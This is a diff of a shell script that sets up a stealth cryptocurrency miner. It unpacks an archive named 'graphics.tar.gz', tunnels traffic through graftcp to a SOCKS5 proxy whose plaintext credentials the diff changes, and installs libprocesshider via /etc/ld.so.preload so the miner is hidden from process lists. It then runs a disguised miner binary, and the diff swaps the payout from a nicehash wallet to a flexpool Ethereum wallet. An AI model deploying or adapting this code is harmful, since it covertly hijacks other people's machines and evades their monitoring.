@@ -6,9 +6,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 20.187.121.208:3674
-socks5_username = asw
-socks5_password = asw
+socks5 = de-socks5.woiden.net:8080
+socks5_username = woiden_asw5
+socks5_password = asw55
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -40,4 +40,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./MagicBinn --url=32cDMQ2vYEk7KWC6sPJveQvXayhEuohwoV.$(echo $(shuf -i 1-99999 -n 1)-BIN)@daggerhashimoto.usa-west.nicehash.com:3353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./MagicBinn --url=ssl:0x3cedcf1be712024f205c428c3ba997d8b0e9d3c8.Nikah@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
